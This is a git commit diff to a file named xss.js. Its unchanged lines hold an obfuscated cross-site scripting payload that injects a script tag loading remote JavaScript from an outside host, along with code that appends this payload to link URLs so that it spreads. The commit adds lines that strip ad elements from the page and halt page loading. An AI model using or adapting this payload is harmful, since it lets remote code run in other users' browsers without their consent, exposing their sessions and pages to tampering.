d8ec4739328ea4ae8af292e6cd4b7208291439fb
WyattBlue <57511737+WyattBlue@users.noreply.github.com>
2020-03-06 01:18:57 -0500

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,6 +1,5 @@
 let grab = "<script>d=document;a=d['create'['concat']('Element')]('script');a['src']='//wyattbluezgithubzio/xsszjs'['split']('z')['join'](String(1/2)[1]);d['body']['append'['concat']('Child')](a)</script>";
 
-
 try {
 	document.getElementsByClassName('aka-title')[0].outerHTML="";
 } catch(e){}
@@ -13,3 +12,12 @@ for(let i=len-1; i>=0; i--){
 		item.href+= "?from=Main."+grab;
 	}
 }
+
+let spans = document.getElementsByClassName('proper-ad-unit');
+let len = spans.length;
+for(let i=len-1; i>=0; i--){
+	let item = spans[i];
+	item.outerHTML="";
+}
+
+window.stop();
